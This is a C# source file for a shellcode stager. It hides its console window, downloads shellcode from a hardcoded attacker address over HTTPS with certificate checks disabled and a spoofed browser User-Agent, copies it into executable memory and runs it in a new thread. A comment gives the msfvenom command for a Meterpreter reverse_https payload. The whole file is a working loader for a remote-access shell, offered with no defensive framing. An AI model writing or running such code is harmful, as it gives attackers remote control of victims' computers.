using System;
using System.Net;
using System.Text;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class Program
{

	
//msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<Attack_IP> LPORT=8080 -f exe > rev.exe
//En la prueba he generado payload en formato exe, quizás con formato c# es más apropiado

    //https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
    [DllImport("kernel32")]
    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

    //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

    //https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
	
	[DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();
	
	[DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

public static void Main()
    {
        string url = "https://192.168.162.5:8080/_-AV47woKK9VoVSjNXOJvA96ALHKsr2LmNc8grsvwQMcvm9i-3cmWCC1tsWcLIzpC9xeub-suNeGMVoUYoJgEvVyFXITrdzcNelfqXU4tvPgW0B8SIbJwUYXFhQq-GWd9A2g3inU";
        Stage(url);
    }

public static void Stage(string url)
    {
        IntPtr h = GetConsoleWindow();
		ShowWindow(h, 0);
        WebClient wc = new WebClient();
		wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
		ServicePointManager.Expect100Continue = true;
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
			
		byte[] shellcode = wc.DownloadData(url);

        UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
        IntPtr threatHandle = IntPtr.Zero;
        UInt32 threadId = 0;
        IntPtr parameter = IntPtr.Zero;
        threatHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
		
        WaitForSingleObject(threatHandle, 0xFFFFFFFF);
    }

}
